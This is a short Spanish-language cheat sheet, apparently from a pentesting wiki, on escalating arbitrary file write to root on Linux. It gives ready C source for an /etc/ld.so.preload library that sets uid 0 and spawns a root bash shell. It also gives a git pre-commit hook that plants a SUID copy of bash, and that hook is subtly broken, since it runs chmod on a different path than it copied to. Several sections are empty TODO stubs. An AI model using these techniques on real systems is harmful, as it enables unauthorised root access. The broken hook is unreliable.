# Arbitrary File Write to Root

### /etc/ld.so.preload

Este archivo se comporta como la variable de entorno **`LD_PRELOAD`** pero también funciona en **binarios SUID**.\
Si puedes crearlo o modificarlo, simplemente puedes agregar una **ruta a una biblioteca que se cargará** con cada binario ejecutado.

Por ejemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Ganchos de Git

[**Ganchos de Git**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) son **scripts** que se **ejecutan** en varios **eventos** en un repositorio de git, como cuando se crea un commit, se realiza un merge... Entonces, si un **script o usuario privilegiado** está realizando estas acciones con frecuencia y es posible **escribir en la carpeta `.git`**, esto puede ser utilizado para **escalada de privilegios**.

Por ejemplo, es posible **generar un script** en un repositorio de git en **`.git/hooks`** para que siempre se ejecute cuando se crea un nuevo commit:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### Archivos Cron y de tiempo

TODO

### Archivos de Servicio y Socket

TODO

### binfmt\_misc

El archivo ubicado en `/proc/sys/fs/binfmt_misc` indica qué binario debe ejecutar qué tipo de archivos. TODO: verificar los requisitos para abusar de esto y ejecutar un shell reverso cuando se abre un tipo de archivo común.
